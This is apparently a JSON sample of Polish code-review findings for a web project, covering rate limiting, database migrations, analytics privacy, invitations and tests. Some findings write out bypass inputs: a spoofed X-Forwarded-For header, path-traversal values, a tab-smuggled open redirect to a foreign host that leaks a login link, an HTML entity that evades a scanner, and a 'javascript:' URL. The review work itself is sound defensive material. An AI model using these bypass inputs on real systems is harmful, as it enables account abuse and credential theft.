+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "server/trasy/wejscie.ts:76",
+   "opis": "Klucz licznika prób wejścia bierze się z `kluczLicznika(kontekst.req.header('x-forwarded-for'))` i wybiera LEWY człon nagłówka — czyli wartość w pełni kontrolowaną przez klienta. Atakujący zgadujący tokeny wysyła `X-Forwarded-For: <losowy adres>` przy każdym żądaniu i trafia za każdym razem do świeżego koszyka, więc limit 10/15 min nigdy się nie odpala. Rate limiting na jedynym publicznym endpoincie zapisu sesji jest w praktyce nieistniejący (coding-rules §9: „Rate limiting na KAŻDYM public endpoint\"). Naprawa: nie ufaj nagłówkowi bezpośrednio — wybierz człon odpowiadający liczbie zaufanych proxy (dla pojedynczego proxy: OSTATNI element listy) albo użyj adresu gniazda z `@hono/node-server` ("
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "supabase/migrations/20260903120000_offer_templates.sql:340",
+   "opis": "`template_assets.storage_path` ma wyłącznie CHECK długości 1–512, bez kontroli kształtu — inaczej niż wszystkie pozostałe kolumny tej migracji, które dostały zamknięte listy albo regexpy. To wartość, którą w IU-4/IU-5 proxy podstawi do wywołania Storage, więc `../`, wiodący `/` albo `..%2f` w tym polu to wejście sterujące ścieżką pobrania. Dopisz w istniejącym bloku `do $$` (obok `template_assets_storage_path_length_check`) constraint `template_assets_storage_path_format_check` z warunkiem `storage_path ~ '^[0-9a-f-]{36}/[0-9a-f]{32}\\.webp$'` — to dokładnie kształt generowany przez `randomStoragePath` w `supabase/tests/rls.test.ts:2493`."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9a-domena-mailer-limity",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "supabase/migrations/20260913120000_account_limits_and_admin_events.sql:181",
+   "opis": "Licznik miesięczny i godzinowy to `count(*)` po ŻYWYCH wierszach `offers`, a właściciel ma `grant delete` + politykę `offers_delete_own` (20260824171406:194 i 255–259). Wektor: przy `50 z 50` właściciel robi `DELETE /rest/v1/offers?id=eq.<id>` własną sesją i publikuje ponownie — pętla publikuj→skasuj→publikuj daje nieograniczoną liczbę publikacji w miesiącu i w godzinie (limit godzinowy jest tu wprost limitem anty-burstowym „per konto w bazie, bo limiter z adresu nie widzi connectora” — R6). Żadna ścieżka produktu nie kasuje ofert (grep `from('offers')`/`.delete()` w `apps/server/src` i `apps/dashboard/src` bez trafień), a zasada naczelna nr 2 mówi, że opublikowana oferta jest niemutowalna. "
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "e2e/seeds/faza-7-grafiki-seed.sql:20",
+   "opis": "Scenariusz E2E `oferta-z-grafika` jest w zadaniach nieodhaczony i nie da się go uruchomić bez kroku ręcznego: SQL nie wgra pliku binarnego, więc plik WebP trzeba wgrać do prywatnego bucketa `template-assets` projektu E2E pod `<owner_id konta E2E>/e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2.webp` (seed poprawnie PRZERYWA, gdy obiektu nie ma). Dopiero po tym da się potwierdzić 200 z `image/webp` na `/i/<id>` i zero naruszeń CSP w konsoli — czyli jedyne miejsce, gdzie sprawdza się realnie, że `img-src` z jawnym originem ofert przepuszcza nową ścieżkę. Weryfikacja niewykonalna headless."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "OPERATOR",
+   "plik": "e2e/seeds/faza-9b-zaproszenie-seed.sql:27",
+   "opis": "Pułapka kolejności seedów, którą łatwo przeoczyć w smoke'u: `faza-9b-zaproszenie-seed.sql` ustawia konto `E2E_TEST_EMAIL` na `access_state = 'oczekujace'` i CZYŚCI `terms_accepted_at`, więc po scenariuszu `zaproszenie-przyjecie` (albo po jego przerwaniu w połowie) jedyne konto harnessu zostaje bez dostępu i KAŻDY kolejny przebieg dowolnego scenariusza panelu startuje na `/zaproszenie` zamiast na `/oferty`. Nic tego nie egzekwuje — przywrócenie to ręczne uruchomienie `e2e/seeds/faza-9b-dostep-aktywne-seed.sql` PO scenariuszu (nagłówek seeda o tym mówi, ale jest to instrukcja dla człowieka). Akcja operatora: wpisz `psql \"$SUPABASE_E2E_DB_URL\" -v ON_ERROR_STOP=1 -f e2e/seeds/faza-9b-dostep-akty"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-8-connector-oauth-i-dashboard",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "e2e/print-magic-link.ts:139",
+   "opis": "Bramka `--redirect` (`!value.startsWith('/') || value.startsWith('//') || value.startsWith('/\\\\')`) jest do obejścia białym znakiem, bo `new URL(value, APP_ORIGIN)` w `parseMagicLinkConfig:175` usuwa tabulatory i znaki końca wiersza Z CAŁEGO wejścia, zanim je sparsuje. Sprawdzone przebiegiem na Node 22: `--redirect=/<TAB>/atakujacy.example` przechodzi bramkę i daje `redirectTo = https://atakujacy.example/`; tak samo `/<LF>/…`, `/<CR>/…` i `/<TAB>\\atakujacy.example`. To dokładnie ta sytuacja, przed którą broni komentarz nad funkcją: harness woła `admin.generateLink` kluczem sekretnym, więc jednorazowe poświadczenie logowania konta E2E dostaje adres powrotu na obcym hoście (skuteczność zależy "
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-2-publikacja-ofert",
+   "miesiac": "2026-08",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "docs/active/faza-2-publikacja-ofert/faza-2-publikacja-ofert-kontekst.md:734",
+   "opis": "Weryfikacja niewykonalna headless (wymaga realnego deploya): (1) ustalenie realnej wartosci TRUSTED_PROXY_IPS — adresu/zakresu, z ktorego Traefik w Coolify laczy sie z kontenerem — i wpisanie jej w ENV; bez zmiennej proces NIE WYSTARTUJE, wiec brak tej pozycji przed deployem zatrzymuje wdrozenie; (2) rozstrzygniecie, czy proxy NADPISUJE czy DOPISUJE X-Forwarded-For (od tego zalezy poprawnosc klucza — patrz finding o skrajnie lewym wpisie); (3) powtorzenie pomiaru z fazy 1: N zadan przez publiczny FQDN z roznymi wartosciami X-Forwarded-For musi dac 429 po przekroczeniu progu (dowod, ze spoof nie tworzy nowych wiader), a zadania dwoch roznych realnych klientow musza dostac osobne wiadra."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "siatka-heatmapy-proporcjonalna",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "e2e/seeds/siatka-proporcjonalna-seed.sql:1",
+   "opis": "Scenariusz [E2E] `mapa-uwagi-siatka-mieszana` i nowy seed nie zostały uruchomione (checkbox w zadaniach fazy pusty, kontekst fazy sam to odnotowuje). Weryfikacja headless jest niewykonalna: seed wymaga bazy stagingowej z ręcznie założoną tabelą-markerem `public.e2e_env_marker`, kontem `e2e@oferty-online.test` i zaaplikowaną migracją `20260831120000_visits_grid_rows` (bez niej `insert ... grid_rows` wywala się), a sam scenariusz — logowania magic linkiem i przeglądarki. Nieodhaczona zostaje też checklista operatora fazy 3 (ocena promienia plamy przy komórce ~100 px na realnych danych). Warunek środowiskowy do sprawdzenia przez operatora, nie defekt kodu."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "apps/server/src/assets/limits.ts:104",
+   "opis": "Trzy komunikaty odmowy (`too-many-pixels`, `corrupted-file`, `optimized-too-large`) powstały POZA zatwierdzonym 2026-09-03 katalogiem 5 tekstów sekcji 3.2, a R18 wymaga tekstów verbatim z zaakceptowanej listy. Teksty są dziś zablokowane asercjami w `limits.test.ts`, więc zmiana po zatwierdzeniu wymaga równoczesnej zmiany testu. Wymagane: zatwierdzenie brzmienia przez operatora albo podanie wersji do przepisania. Decyzja produktowa, nie defekt kodu."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "TEST",
+   "plik": "supabase/tests/rls.test.ts:6417",
+   "opis": "Bramka `expires_at > now()` w `accept_invitation()` jest zmianą wprowadzoną w tej fazie z uzasadnieniem bezpieczeństwa („adres zaproszony pół roku temu dawałby dostęp po każdym późniejszym zalogowaniu\") i nie ma ANI JEDNEGO testu odmowy — blok `zaproszenia i zakładanie konta (D5)` sprawdza wyłącznie zaproszenie żywe, idempotencję i konto bez zaproszenia. Usunięcie tego warunku z migracji nie zapali dziś żadnego testu, czyli bramka jest niestrzeżona. Dodaj w tym `describe` scenariusz: kluczem sekretnym wstaw zaproszenie z `expires_at` w przeszłości dla nowego konta (`createAccount`), po zalogowaniu zawołaj `accept_invitation()` i asertuj `42501` z `message = 'brak_zaproszenia'` oraz `access_s"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-2-publikacja-ofert",
+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/offer/template.ts:177",
+   "opis": "`renderBlock` to switch bez gałęzi domyślnej — wyczerpujący tylko na poziomie typów. Bloki przyjdą z MCP (JSON spoza TS), więc `kind` spoza unii da `undefined`, które `.join('')` wklei do dokumentu jako literalne „undefined” w niemutowalnym HTML, bez żadnego błędu. Akcja: dopisać po `case 'files'` gałąź domyślną rzucającą `OfferTemplateError` z nazwą nieznanego `kind` (fail fast, jak `assertSections`) plus jeden test na nieznany blok."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/admin/admin-shape.ts:192",
+   "opis": "Pole `email` w `account()` jest jedynym polem, które przy nieznanym kształcie CICHO degraduje zamiast odrzucić wiersz: `email: row['email'] === null ? null : text(row['email'])` — dla wartości innej niż tekst i inna niż `null` (liczba, obiekt, pusty łańcuch) `text()` oddaje `null`, a karta konta pokazuje wtedy `ADMIN_TEXTS.noEmail`, czyli stan „konto bez wiersza w auth.users\", którego nie ma. Komentarz dwie linie wyżej twierdzi coś przeciwnego („`null` przechodzi, a każda inna wartość niż tekst — nie\"), więc kod i jego uzasadnienie są sprzeczne, a test w `admin-shape.test.ts` pokrywa wyłącznie wariant `email: null`. Akcja: po wyliczeniu `email` dołóż odrzucenie rozjazdu — `if (row['email'] !"
+  }
+ ],
+ "zgloszone_probka": [
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/admin/use-admin-events.ts:91",
+   "opis": "`toDetails` kończy się rzutowaniem `return value as Readonly<Record<string, unknown>>;` — to samo naruszenie §10, którego sąsiedni moduł świadomie unika (`admin-shape.ts:80` ma komentarz „Predykat typu, nie rzutowanie (§10): `as Record<string, unknown>` tylko zakłada kształt, którego nikt nie sprawdził\"). Akcja: wydziel predykat `function isDetailsRecord(value: unknown): value is Readonly<Record<string, unknown>> { return typeof value === 'object' && value !== null && !Array.isArray(value); }` i zamień ciało `toDetails` na `return isDetailsRecord(value) ? value : {};` — zero asercji, ta sama semantyka i te same testy."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/lib/analytics.ts:287",
+   "opis": "Zdarzenia wysłane ZANIM rozwiąże się dynamiczny import SDK przepadają bez śladu — a dwa z nich to `logowanie` i `identify(owner_id)` z `features/auth/session-context.tsx:63`. `initAnalytics()` leci z `main.tsx` jako `void`, `client` zostaje `null` do czasu pobrania chunku (~98 KB), a `track`/`identifyUser` są w tym oknie cichym no-opem. `SessionProvider` woła `applySession` po `getSession()`, które przy odtworzeniu sesji z localStorage rozwiązuje się szybciej niż fetch chunku (pierwsze wejście po deployu, pusty cache — praktycznie zawsze). Skutek: brak zdarzenia `logowanie` (R11 wymienia je wprost, operator sprawdza je w smoke'u fazy) i brak `identify` — przy `persistence: 'memory'` i `perso"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "apps/server/src/access/registration-service.ts:211",
+   "opis": "signInWithOtp idzie z JEDNEGO adresu (egress Node na Coolify), wiec per-IP limit GoTrue na /auth/v1/otp (rate_limit_otp, domyslnie 30 zadan / 5 min per IP) obejmuje CALY ruch rejestracji produktu. Przy ogloszeniu bez kohort (1178 czlonkow) odbicie over_request_rate_limit NIE trafia w biala liste EMAIL_RATE_LIMIT_CODE i wychodzi jako RegistrationServiceError -> 503 sprawdzenie_nieudane + captureException per zadanie (falszywa awaria dla kursanta, burza raportow Sentry). Zmierz na refie wdrozonym GET /v1/projects/<ref>/config/auth -> rate_limit_otp i na stagingu kod bledu GoTrue przy przekroczeniu z jednego IP; jesli limit per-IP dziala na ruch serwera, podnies go przez Management API PRZED og"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/admin/admin-shape.ts:192",
+   "opis": "Pole `email` w `account()` jest jedynym polem, które przy nieznanym kształcie CICHO degraduje zamiast odrzucić wiersz: `email: row['email'] === null ? null : text(row['email'])` — dla wartości innej niż tekst i inna niż `null` (liczba, obiekt, pusty łańcuch) `text()` oddaje `null`, a karta konta pokazuje wtedy `ADMIN_TEXTS.noEmail`, czyli stan „konto bez wiersza w auth.users\", którego nie ma. Komentarz dwie linie wyżej twierdzi coś przeciwnego („`null` przechodzi, a każda inna wartość niż tekst — nie\"), więc kod i jego uzasadnienie są sprzeczne, a test w `admin-shape.test.ts` pokrywa wyłącznie wariant `email: null`. Akcja: po wyliczeniu `email` dołóż odrzucenie rozjazdu — `if (row['email'] !"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/server/src/routes/access.test.ts:326",
+   "opis": "Test 'link wyslany' asertuje zero zdarzen admina, ale nie asertuje, ze rejestracja NIE zapisuje wiersza access_requests (R7: wpis dopiero po potwierdzeniu w osobnym kroku karty) - handler wolajacy access.saveRequest przeszedlby zielono. Dodaj po linii 326: expect(harness.service.saved).toEqual([])."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/server/src/access/redirect-path.test.ts:48",
+   "opis": "Tabela odmów `it.each` nie zawiera wektora z białym znakiem W ŚRODKU ścieżki, który w review fazy 8/4 obszedł bramkę harnessu (`/<TAB>/atakujacy.example` → WHATWG URL usuwa tabulator i parsuje `//atakujacy.example` jako authority). Dzisiejsza bramka odrzuca go przez `PRINTABLE_ASCII` (sprawdzone: `/\\t/evil.example` i `/\\r/evil.example` → `nieprawidlowa`), ale jedyny test znaku kontrolnego to `\\n` NA KOŃCU ścieżki — regresja zamieniająca `PRINTABLE_ASCII` na `trim()`+sprawdzenie końców przeszłaby zielono. Akcja: dopisz do `it.each` z odmowami trzy wiersze: `['tabulator w środku (obejście z review fazy 8)', '/\\t/evil.example']`, `['CR w środku', '/\\r/evil.example']`, `['LF w środku', '/\\n\\nevi"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9a-domena-mailer-limity",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/offers-list.tsx:118",
+   "opis": "Strażnik kliknięcia wiersza tabeli desktopowej wymienia tylko `closest('a, button')`, a po odmowie schowka `CopyAddressButton` dokłada do komórki `<span role=\"alert\">` i `<input readonly>` z adresem — żaden z nich nie jest ani `<a>`, ani `<button>`. Scenariusz: klient bez Clipboard API (zwykły `http:`, okno bez fokusu, odmowa uprawnienia) klika „Kopiuj\" w wierszu listy → pojawia się komunikat „Nie udało się skopiować. Zaznacz adres i skopiuj go ręcznie.\" i pole z adresem → użytkownik klika (albo przeciąga zaznaczenie) w tym polu → zdarzenie bąbelkuje do `<tr onClick>`, `closest('a, button')` zwraca `null` i router nawiguje do `/oferty/<slug>`; pole awaryjne znika razem z listą, więc jedyna d"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9a-domena-mailer-limity",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/limits/limit-error.ts:33",
+   "opis": "Odpowiedź na pozycję „Otwarte do review” z dossier: dwa moduły eksportują identyczne identyfikatory `ACCOUNT_LIMIT_KINDS`/`AccountLimitKind` o RÓŻNYCH wartościach (`packages/shared/src/account-limits-contract.ts:31` — rodzaje wierszy RPC `oferty_miesiac|…`; ten plik — `message` triggerów `limit_ofert_miesiac|…`). Dziś żaden plik nie importuje obu, ale pierwszy, który to zrobi (np. serwerowy konsument RPC albo `admin_events.details.kind` czytany w 9b obok kontraktu RPC), dostanie cichy konflikt nazw rozstrzygany aliasem przy imporcie. Zmień w tym pliku nazwy na `LIMIT_REFUSAL_KINDS` i `LimitRefusalKind` (to są nazwy ODMÓW z triggera, nie rodzaje limitów) i popraw importy w `apps/server/src/ad"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9a-domena-mailer-limity",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/dashboard/src/features/templates/templates-api.test.ts:478",
+   "opis": "`parseRetryAfterSeconds` jest eksportowana i jest bramką z progiem z dwóch stron, ale ma pokryte tylko dwa wejścia przez testy wyższego poziomu: nagłówek `7` i brak nagłówka. Bez testu odmowy zostają wektory, dla których błędna zmiana implementacji byłaby niewidoczna: `'0'` (ponowienie natychmiast = pętla żądań odbijanych limiterem), `'-5'`, `'999'` (kolejka zawieszona ponad kontrakt), postać daty HTTP dopuszczona przez RFC (`'Wed, 21 Oct 2015 07:28:00 GMT'`) i `'  '`. Wszystkie muszą dać `UPLOAD_RETRY_AFTER_SECONDS.max`. AKCJA: dopisz w tym pliku osobny `describe('parseRetryAfterSeconds')` z `it.each([['zero','0'],['ujemna','-5'],['ponad sufit','999'],['data HTTP','Wed, 21 Oct 2015 07:28:00"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/auth/session-context.tsx:47",
+   "opis": "Brak zdarzenia „logowanie”, wymaganego przez R11 („zdarzenia: logowanie, …”) i przez pozycję smoke'u operatora tej fazy („smoke: zdarzenie »logowanie« widoczne w projekcie EU”). `ANALYTICS_EVENTS` ma `loggedOut: 'wylogowanie'`, ale nie ma odpowiednika dla wejścia — `grep` po `ANALYTICS_EVENTS.` w `apps/dashboard/src` potwierdza, że w sesji wołane jest wyłącznie `identifyUser`, a `identify` nie jest zdarzeniem policzalnym w PostHogu. Operator nie ma jak odhaczyć smoke'u, a najważniejsza metryka aktywacji nie powstaje. NAPRAWA: dopisz do `apps/dashboard/src/lib/analytics-events.ts` wpis `loggedIn: 'logowanie'` i w tym pliku, w gałęzi `if (session !== null)`, wywołaj `track(ANALYTICS_EVENTS.log"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/lib/analytics.ts:56",
+   "opis": "`apiHost()` przyjmuje adres o DOWOLNYM schemacie: `buildUrl` odrzuca tylko to, czego nie zparsuje `new URL`, więc `VITE_POSTHOG_HOST=javascript:alert(1)` albo `http://…` przechodzi i ląduje w `api_host`. To bramka opisana tym, czego nie ma (brak białej listy), wbrew regule z `learned-patterns.md`; w repo jest już wzorzec zamkniętej białej listy schematów (`lib/safe-redirect.ts`). NAPRAWA: po wywołaniu `buildUrl` w `apiHost()` dodaj sprawdzenie `if (url !== null && url.protocol !== 'https:') { return null; }` (analityka gaśnie, jak przy literówce) i dołóż do `analytics.test.ts` przypadek z `VITE_POSTHOG_HOST='http://analityka.example.invalid'` asertujący `expect(posthogMock.init).not.toHaveBe"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/admin/use-admin-accounts.ts:228",
+   "opis": "`rpcMutation` kasuje CAŁĄ treść odmowy bazy: `return error === null ? { kind: 'ok' } : { kind: 'odmowa', code: null, message: null }` — obiekt `error` z `postgrest-js` (z `code`, `message`, `details`) jest porzucany, nie trafia do Sentry i nie trafia do `refusalText`. Dotyczy TRZECH mutacji sterujących bezpieczeństwem konta: `admin_set_access` (nadpisanie stanu dostępu), `admin_set_account_limits` i `admin_set_registration_mode`. Każda odmowa — RLS `42501` (konto straciło rolę admina w trakcie sesji), `wlasne_konto`, `stan_niedozwolony`, `limit_musi_byc_dodatni`, awaria sieci — daje na ekranie jedno nierozróżnialne zdanie `ADMIN_TEXTS.mutationFailed` i ZERO śladu gdziekolwiek. Łamie §4 reguł"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P3",
+   "typ": "OPERATOR",
+   "plik": "e2e/seeds/faza-9b-zaproszenie-seed.sql:27",
+   "opis": "Pułapka kolejności seedów, którą łatwo przeoczyć w smoke'u: `faza-9b-zaproszenie-seed.sql` ustawia konto `E2E_TEST_EMAIL` na `access_state = 'oczekujace'` i CZYŚCI `terms_accepted_at`, więc po scenariuszu `zaproszenie-przyjecie` (albo po jego przerwaniu w połowie) jedyne konto harnessu zostaje bez dostępu i KAŻDY kolejny przebieg dowolnego scenariusza panelu startuje na `/zaproszenie` zamiast na `/oferty`. Nic tego nie egzekwuje — przywrócenie to ręczne uruchomienie `e2e/seeds/faza-9b-dostep-aktywne-seed.sql` PO scenariuszu (nagłówek seeda o tym mówi, ale jest to instrukcja dla człowieka). Akcja operatora: wpisz `psql \"$SUPABASE_E2E_DB_URL\" -v ON_ERROR_STOP=1 -f e2e/seeds/faza-9b-dostep-akty"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9a-domena-mailer-limity",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/offer/offer-favicon.ts:85",
+   "opis": "Bramka `hasOwnFaviconLink` (a przez nią `assertNoOwnFavicon` w obu walidacjach) da się obejść odwołaniem znakowym w wartości `rel`: `<link rel=\"&#105;con\" href=\"/favicon.svg\">` przeglądarka dekoduje do `rel=\"icon\"` (ikona AA w karcie oferty — zasada nr 1), a skaner widzi token `&#105;con` i przepuszcza (zweryfikowane uruchomieniem: `false`). `validation.ts` ma już dokładnie tę furtkę zamkniętą dla adresów (`decodeCharacterReferences` przed `assertNoAbsoluteUrl`), a tutaj jej brakuje. Wektory sprawdzone: encja (PRZECHODZI), `rel=icon` bez cudzysłowu (odrzuca), tabulator jako separator tokenów (odrzuca), wielkie litery (odrzuca), `mask-icon`/`apple-touch-icon` (przechodzi — świadoma decyzja z "
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "supabase/migrations/20260914100000_access_invitations_admin.sql:837",
+   "opis": "Asymetria kryterium „żywego zaproszenia\" między dwiema funkcjami tej samej migracji: `handle_new_user()` szuka zaproszenia po `accepted_at is null and revoked_at is null` BEZ `expires_at > now()`, a `accept_invitation()` (linia 777) wymaga `expires_at > now()` (świadome zaostrzenie dopisane w „Korektach po fazie 1\"). Skutek: konto założone na adres z WYGASŁYM zaproszeniem dostaje od `handle_new_user` stan `oczekujace` (bo `found` jest prawdą) i `source` z martwego zaproszenia, po czym `accept_invitation()` nie dopasowuje niczego i rzuca `brak_zaproszenia`. W trybie rejestracji `otwarta` to trwały lockout: konto, które BEZ zaproszenia wstałoby jako `aktywne`, przez wygasły wiersz w `invitatio"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/src/offer/pages/app-privacy-page.ts:108",
+   "opis": "Nowa sekcja 5 polityki prywatności (publiczna, na APP_ORIGIN) obiecuje: „Adres usuwamy po wysłaniu zaproszenia albo po 12 miesiącach od zapisu\". W kodzie i w bazie NIE MA ani jednej ścieżki kasującej wiersz `access_requests`: `invitation-service.ts` po udanym `signInWithOtp` nie dotyka tej tabeli, `routes/admin-accounts.ts` nie ma endpointu usuwania prośby, a migracja `20260914100000` nie zakłada ani zadania cron, ani triggera czyszczącego (grep `access_requests` w apps/server/src + supabase/migrations: wyłącznie SELECT i UPSERT). Ten sam adres zostaje też na zawsze w `admin_events.details.email` zdarzenia `zapis_chce_dostep` (jedyne miejsce w produkcie z jawnym e-mailem w dzienniku), a dzie"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P2",
+   "typ": "TEST",
+   "plik": "apps/dashboard/src/lib/analytics.test.ts:34",
+   "opis": "Brak TESTU ODMOWY dla właściwości adresowych zdarzeń. `EXPECTED_OPTIONS` sprawdza komplet opcji `init` metodą `toEqual` (dobrze), ale ani jeden przypadek nie sprawdza ŁADUNKU zdarzenia — a to ładunkiem wycieka `$current_url` (finding P1). Test „track przekazuje nazwę i właściwości liczbowe” asertuje `capture.mock.calls[0]?.[1]` równe `{ liczba_plikow: 3 }`, czyli mierzy wyłącznie to, co sami przekazaliśmy, i jest zielony dla każdej implementacji, także takiej, która wysyła pełny adres w właściwościach automatycznych. NAPRAWA: po wdrożeniu `sanitize_properties` z findingu P1 dodaj w tym pliku przypadek wołający funkcję sanityzacji przekazaną do `posthog.init` (odczytaną z `posthogMock.init.mo"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "supabase/migrations/20260917100000_membership_hashes_self_registration.sql:413",
+   "opis": "`accept_terms()` droga 1 (żywe zaproszenie) ustawia `source = v_invitation_source` bezwarunkowo. Scenariusz D4 „hash wygrywa z zaproszeniem”: `handle_new_user` zakłada konto `akademia`/`oczekujace`, zaproszenie `zewnetrzne` zostaje żywe, a `accept_terms()` (droga 1 przed drogą 2) PRZEPISUJE `source` z `akademia` na `zewnetrzne`. Skutek: członek AA wychodzi spod reguły stanów `apply_membership_list` (krok stanów obejmuje tylko `akademia`) do następnego pushu, który przepina go z powrotem i emituje fałszywe `konto_przepiete_na_akademie`. Naprawa: w drodze 1 ustawiaj `source = case when p.source = 'akademia' then p.source else v_invitation_source end` (albo sprawdź hash PRZED domknięciem zapros"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "supabase/migrations/20260917100000_membership_hashes_self_registration.sql:186",
+   "opis": "Podmiana listy (`delete` + `insert`) biegnie PRZED jedyną blokadą (`perform … for update` na `profiles`, linie 193–206), a tabela `membership_hashes` nie jest blokowana. Dwa nakładające się pushe (ponowienie automatu AA po timeoucie 30 s, dwa równoległe `POST /api/czlonkostwo`) w READ COMMITTED: `delete` drugiej transakcji nie widzi wierszy wstawionych przez pierwszą, więc wynik to UNIA obu list (członek, który odszedł, zostaje na liście bez śladu) albo `23505` na wspólnych hashach — niezmiennik D1 „lista podmieniana w całości” nie jest egzekwowany. Naprawa: jako pierwszą instrukcję po walidacji pustej listy dodaj `lock table public.membership_hashes in share row exclusive mode;` (serializuj"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/access/registration-mode-api.ts:57",
+   "opis": "Rzutowanie `const mode: unknown = (data as { readonly tryb: unknown }).tryb;` łamie §10 reguł („NIGDY nie używaj type assertions (`as`) chyba że konieczne dla DOM narrowing\"), a konieczne tu nie jest: warunek `'tryb' in data` w linii 53 już zawęża `data` do typu z własnością `tryb`, więc TypeScript przepuszcza odczyt bez asercji. Akcja: zamień linię 57 na `const mode: unknown = data.tryb;` i skasuj rzutowanie (zachowanie i testy bez zmian — `readMode` dalej odsiewa wartości spoza `REGISTRATION_MODES`)."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9b-wielu-uzytkownikow",
+   "severity": "P1",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/lib/analytics.ts:81",
+   "opis": "WYCIEK ADRESÓW OFERT I `authorization_id` DO POSTHOGA. Opcje `init` nie tłumią właściwości adresowych, a PostHog dokleja `$current_url` (pełny href z query), `$pathname` i `$host` do KAŻDEGO zdarzenia i do `$pageview` — zweryfikowane w kodzie SDK: `node_modules/.pnpm/@posthog+browser-common@0.8.3/.../dist/utils/event-utils.mjs:230` (`$current_url: maskQueryParams(... location?.href ...)`, `$pathname: location?.pathname`) oraz lista `$current_url` w zestawie właściwości domyślnych (linia 46). `mask_personal_data_properties` jest domyślnie wyłączone, a `capture_pageview: 'history_change'` dodatkowo emituje zdarzenie przy każdej zmianie trasy SPA. Konsekwencje wprost z `routes.ts`: (1) `/oferty"
+  },
+  {
+   "projekt": "akademia-automatyzacji-dashboard",
+   "zadanie": "traferto-membership-emission",
+   "severity": "P3",
